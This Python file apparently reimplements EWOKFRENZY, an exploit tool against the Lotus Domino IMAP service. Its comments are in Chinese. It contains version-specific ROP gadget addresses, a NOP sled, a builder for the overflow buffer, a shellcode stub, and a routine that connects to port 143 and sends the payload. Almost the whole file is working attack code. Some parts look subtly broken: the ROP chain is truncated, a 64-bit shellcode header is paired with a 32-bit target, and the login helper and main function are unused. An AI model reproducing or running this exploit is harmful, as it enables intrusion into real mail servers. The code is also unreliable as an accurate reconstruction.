"""ewok_frenzy — EWOKFRENZY Lotus Domino IMAP 利用核心逻辑。

Python 重写的 `Ewokfrenzy-2.0.0.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 Lotus Domino IMAP 利用流程。

参数定义来源：Ewokfrenzy-2.0.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 143
DEFAULT_TIMEOUT = 60

DOMINO_VERSION_GADGETS = {
    "6.5.4": {
        "AddrPopEax": 0x00428463,
        "AddrVirtualAlloc": 0x0042E038,
        "AddrJmpEaxPtr": 0x00420CF5,
        "AddrPopEdi": 0x60132252,
        "AddrEaxToEsi": 0x60951039,
        "AddrCopyCode": 0x607112B4,
        "AddrIncEax": 0x60168187,
        "AddrJmpEax": 0x600A371D,
        "AddrSetAtEdxRet": 0x609DBEA1,
        "AddrClrEaxRet": 0x0042845E,
        "OffsetEsp2Buffer": 0xBC,
        "OffsetEsp2Ebp": 0x90,
        "CleanupOverflowed": 0x60A528EC,
    },
    "7.0.2": {
        "AddrPopEax": 0x0042A001,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041D5A7,
        "AddrPopEdi": 0x0042CB58,
        "AddrEaxToEsi": 0x100AAADD,
        "AddrCopyCode": 0x60709A24,
        "AddrIncEax": 0x600F8E54,
        "AddrJmpEax": 0x00429A6C,
        "AddrSetAtEdxRet": 0x004050A7,
        "AddrClrEaxRet": 0x6001FAC1,
        "OffsetEsp2Buffer": 0xBC,
        "OffsetEsp2Ebp": 0x90,
        "CleanupOverflowed": 0x60B3FDF8,
    },
}

EWOK_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class EwokFrenzyError(Exception):
    pass


def connect(target_ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_imap_login(username, password):
    return f"1 LOGIN {username} {password}\r\n".encode("ascii")


def build_domino_overflow(shellcode, gadgets):
    """构建 Lotus Domino 缓冲区溢出负载。

    根据 x32dbg 分析，EWOKFRENZY 通过向 Domino IMAP 服务器发送
    特制的 IMAP 请求，触发缓冲区溢出，利用 ROP 链执行 shellcode。
    """
    offset = gadgets.get("OffsetEsp2Buffer", 0xBC)
    nopsled = b"\x90" * offset
    ret_addr = struct.pack("<I", gadgets["AddrJmpEax"])
    rop_chain = struct.pack("<I", gadgets["AddrPopEax"])
    rop_chain += struct.pack("<I", gadgets["AddrVirtualAlloc"])
    rop_chain += struct.pack("<I", gadgets["AddrJmpEax"])
    return nopsled + ret_addr + rop_chain + shellcode


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    domino_version="7.0.2",
    callback_ip=None,
    callback_port=None,
    callback_local_port=None,
    verbose=False,
):
    """执行 EWOKFRENZY 利用序列。

    阶段：
      1. TCP 连接到目标 Domino IMAP 端口 (默认 143)
      2. 发送 IMAP LOGIN 请求（若提供凭证）
      3. 构建并发送 Domino 缓冲区溢出负载 (ROP + shellcode)
      4. 载荷投递（Callback）
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Domino version: {domino_version}")
        print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")

    gadgets = DOMINO_VERSION_GADGETS.get(domino_version, DOMINO_VERSION_GADGETS["7.0.2"])

    if verbose:
        print(f"[*] AddrPopEax: 0x{gadgets['AddrPopEax']:08X}")
        print(f"[*] AddrVirtualAlloc: 0x{gadgets['AddrVirtualAlloc']:08X}")
        print(f"[*] AddrJmpEax: 0x{gadgets['AddrJmpEax']:08X}")
        print(f"[*] OffsetEsp2Buffer: 0x{gadgets['OffsetEsp2Buffer']:03X}")
        print(f"[*] OffsetEsp2Ebp: 0x{gadgets['OffsetEsp2Ebp']:03X}")

    # 建立 TCP 连接（IMAP 143）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EwokFrenzyError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        # 读取 IMAP 问候语
        try:
            greeting = sock.recv(4096)
            if verbose:
                print(f"[*] IMAP 问候语: {greeting[:128]}")
        except OSError:
            pass

        # 构建 Domino 缓冲区溢出负载
        shellcode = EWOK_SHELLCODE_PLACEHOLDER
        overflow = build_domino_overflow(shellcode, gadgets)
        if verbose:
            print(f"[+] 溢出负载: {len(overflow)} 字节")

        # 发送溢出负载
        sock.sendall(overflow)
        try:
            resp = sock.recv(4096)
            if verbose:
                print(f"[*] 溢出应答: {resp[:64].hex() if resp else '无'}")
        except OSError:
            if verbose:
                print("[*] 目标连接已关闭（可能已触发溢出）")

        if verbose:
            print("[+] EWOKFRENZY 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
